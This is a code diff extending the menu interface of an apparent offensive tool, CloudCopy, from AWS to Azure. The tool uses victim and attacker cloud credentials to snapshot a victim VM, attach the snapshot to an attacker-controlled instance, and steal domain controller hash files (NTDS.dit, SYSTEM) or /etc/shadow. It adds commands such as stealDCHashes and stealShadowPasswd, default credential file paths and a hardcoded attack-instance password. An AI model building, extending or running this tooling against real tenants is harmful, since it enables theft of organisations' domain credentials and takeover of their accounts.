@@ -2,6 +2,8 @@ import cmd
 import glob
 import os
 import re
+import shlex
+
 try:
     import readline
     # readline is weird on some systems
@@ -13,6 +15,7 @@ except (ImportError, TypeError):
     import pyreadline as readline
 
 from CloudCopyUtils import CloudCopyUtils
+from AzureCloudCopy import *
 
 # These might change, I'll probably forget to update it
 REGIONS = ['us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'ap-east-1',
@@ -21,7 +24,8 @@ REGIONS = ['us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'ap-east-1',
            'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1',
            'sa-east-1', 'us-gov-east-1', 'us-gov-west-1']
 
-
+AZURE_REGIONS = ['Central US', 'East US 2', 'East US', 'North Central US', 'South Central US', 'West US 2',
+                 'West Central US', 'West US', 'Canada Central', 'Canada East', 'Brazil South']
 '''
 This class is the base command interpreter that handles the user input. 
 Different attacks or modes extend this and add new commands.
@@ -29,9 +33,7 @@ Different attacks or modes extend this and add new commands.
 class BaseCmdInterpreter(cmd.Cmd):
 
     def __init__(self):
-        self.options = {
-            'attackeraccountid': '',  # the id of the attacker owned AWS account that is used to share the snapshot with
-        }
+        self.options = {}
         super(BaseCmdInterpreter, self).__init__()
 
     def cmdloop(self, intro=None):
@@ -56,6 +58,12 @@ class BaseCmdInterpreter(cmd.Cmd):
         profiles = re.findall('\[.+\]', credentials)
         return list(map(lambda x:x[1:-1], profiles))
 
+    def _complete_azure_profiles(self, path):
+        if os.path.isdir(path):
+            return glob.glob(os.path.join(path, '*'))
+        else:
+            return glob.glob(path + '*')
+
     # lists results from previous 'stealDCHashes' attempt. If the 'secrets*' files have been moved this returns nothing
     def do_list_hashes(self, args):
         """list_hashes
@@ -74,12 +82,58 @@ class BaseCmdInterpreter(cmd.Cmd):
         if len(arguments) < 2:
             print("Not enough arguments")
         else:
-            self.options[arguments[0]] = arguments[1]
+            self.options[arguments[0]] = " ".join(arguments[1:])
+
+    def printGap(self):
+        print('---------------------------------------------------------')
 
     # auto complete helper for setting options
     def complete_set(self, text, line, begidx, endidx):
         options = self.options.keys()
-        if 'region' in line:
+        if 'azureregion' in line:
+            if text:
+                completions = [f
+                               for f in AZURE_REGIONS
+                               if f.startswith(text)
+                               ]
+            else:
+                completions = AZURE_REGIONS
+        elif 'authfile' in line:
+            try:
+                glob_prefix = line[:endidx]
+
+                # add a closing quote if necessary
+                quote = ['', '"', "'"]
+                while len(quote) > 0:
+                    try:
+                        split = [s for s in shlex.split(glob_prefix + quote[0]) if s.strip()]
+                    except ValueError as ex:
+                        assert str(ex) == 'No closing quotation', 'Unexpected shlex error'
+                        quote = quote[1:]
+                    else:
+                        break
+                assert len(quote) > 0, 'Could not find closing quotation'
+
+                # select relevant line segment
+                glob_prefix = split[-1] if len(split) > 1 else ''
+
+                # expand tilde
+                glob_prefix = os.path.expanduser(glob_prefix)
+
+                # find matches
+                matches = glob.glob(glob_prefix + '*')
+
+                # append os.sep to directories
+                matches = [match + "/" if Path(match).is_dir() else match for match in matches]
+
+                # cutoff prefixes
+                cutoff_idx = len(glob_prefix) - len(text)
+                matches = [match[cutoff_idx:].replace("\\", "/") for match in matches]
+
+                return matches
+            except:
+                print("error while parsing file path")
+        elif 'region' in line:
             if text:
                 completions = [f
                                for f in REGIONS
@@ -117,18 +171,79 @@ class BaseCmdInterpreter(cmd.Cmd):
 
 
 '''
-Generic CloudCopy class that the two access types extend off of
-Both access methods use the same path to steal DC hashes what
-changes is how you authenticate to AWS. Subclasses implement the
-stealDHashes method to perform the authentication 
+Generic CloudCopy class for Azure that the Service Principal access type extends from
 '''
-class BaseCloudCopy(BaseCmdInterpreter):
+
+
+class BaseAzureCloudCopy(BaseCmdInterpreter):
 
     def __init__(self, parentOptions):
         BaseCmdInterpreter.__init__(self)
         self.cloudCopier = None
         self.options = parentOptions
-        self.options['region'] = ''  # AWS region for accessing the victim instance
+
+    # runs the cleanup function manually so users have control of when the instance dies
+    def do_cleanup(self, args):
+        if self.cloudCopier:
+            self.cloudCopier.cleanup()
+        else:
+            print("Nothing to cleanup")
+
+    def initCloudCopy(self):
+        if '' not in [value for key, value in self.options.items()]:
+            try:
+                print(self.options)
+                self.cloudCopier = AzureCloudCopy(self.options)
+                return self.cloneNewInstance()
+            except Exception as e:
+                print(e)
+                print("Error creating instance or getting client")
+                return False
+        else:
+            print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")
+            return False
+
+    def do_stealShadowPasswd(self, args):
+        if self.initCloudCopy():
+            self.cloudCopier.stealShadowPasswd()
+
+    # steals SYSTEM and NTDS.dit file
+    def do_stealDCHashes(self, args):
+        if self.initCloudCopy():
+            self.cloudCopier.stealDCHashFiles()
+
+    # helper for performing the CloudCopy attack from scratch
+    def cloneNewInstance(self):
+        try:
+            if self.cloudCopier.pickResourceGroup():
+                self.printGap()
+                if self.cloudCopier.pickVmToSteal():
+                    self.printGap()
+                    if self.cloudCopier.generateSnapshot():
+                        self.printGap()
+                        if self.cloudCopier.createVmWithSnapshot():
+                            self.printGap()
+                            return True
+        except KeyboardInterrupt:
+            print("User cancelled cloudCopy, cleaning up...")
+            self.cloudCopier.cleanup()
+        return False
+
+
+'''
+Generic CloudCopy class for AWS that the two access types extend off of
+Both access methods use the same path to steal DC hashes what
+changes is how you authenticate to AWS. Subclasses implement the
+stealDHashes method to perform the authentication 
+'''
+
+
+class BaseAWSCloudCopy(BaseCmdInterpreter):
+
+    def __init__(self, parentOptions):
+        BaseCmdInterpreter.__init__(self)
+        self.cloudCopier = None
+        self.options = parentOptions
 
     # runs the cleanup function manually so users have control of when the instance dies
     def do_cleanup(self, args):
@@ -228,21 +343,43 @@ class BaseCloudCopy(BaseCmdInterpreter):
 
 
 '''
+BaseAzureCloudCopy sub-class that uses Security Principle accounts to authenticate to Azure and perform CloudCopy
+'''
+
+
+class AzureSecPrincipleCloudCopy(BaseAzureCloudCopy):
+
+    def __init__(self, parentOptions):
+        super(AzureSecPrincipleCloudCopy, self).__init__(parentOptions)
+        self.prompt = "(Azure SecProfile CloudCopy)"
+        self.options['victimauthfile'] = '/Users/Tanner/victimcredentials.json'
+        self.options['attackerauthfile'] = '/Users/Tanner/mycredentials.json'
+        self.options['attackinstancepassword'] = 'Superleetsecret1!'
+        self.options['azureregion'] = 'EAST US'
+
+'''
 BaseCloudCopy sub-class that uses .aws/credentials profiles to authenticate to AWS and perform CloudCopy
 '''
-class ProfileCloudCopy(BaseCloudCopy):
+
+
+class ProfileCloudCopy(BaseAWSCloudCopy):
 
     def __init__(self, parentOptions):
         super(ProfileCloudCopy, self).__init__(parentOptions)
         self.prompt = "(Profile CloudCopy)"
         self.options['attackerProfile'] = ''  # name of .aws/credentials profile that pertains to attacker account
         self.options['victimProfile'] = ''  # name of .aws/credentials profile that pertains to victim account
+        self.options['region'] = ''  # AWS region for accessing the victim instance
+        self.options[
+            'attackeraccountid'] = ''  # the id of the attacker owned AWS account that is used to share the snapshot with
 
 
 '''
 BaseCloudCopy sub-class that uses user supplied credentials to authenticate to AWS and perform CloudCopy
 '''
-class ManualCloudCopy(BaseCloudCopy):
+
+
+class ManualCloudCopy(BaseAWSCloudCopy):
 
     def __init__(self, parentOptions):
         super(ManualCloudCopy, self).__init__(parentOptions)
@@ -251,6 +388,9 @@ class ManualCloudCopy(BaseCloudCopy):
         self.options['attackerSecretKey'] = ''  # SecretKey to attacker account
         self.options['victimAccessKey'] = ''  # AccessKey to victim account
         self.options['victimSecretKey'] = ''  # SecretKey to attacker account
+        self.options['region'] = ''  # AWS region for accessing the victim instance
+        self.options[
+            'attackeraccountid'] = ''  # the id of the attacker owned AWS account that is used to share the snapshot with
 
 
 '''
@@ -299,6 +439,13 @@ For one attack path:
         sub_cmd.cmdloop()
         self.reset_options()
 
+    # initiates manual based Azure CloudCopy attack
+    def do_azure_secprinciple_cloudcopy(self, args):
+        """Azure_cloudcopy using security principle accounts
+        CloudCopy attack using manually security principle accounts"""
+        sub_cmd = AzureSecPrincipleCloudCopy(self.options)
+        sub_cmd.cmdloop()
+        self.reset_options()
 
 if __name__ == '__main__':
     cmd = MainMenu()
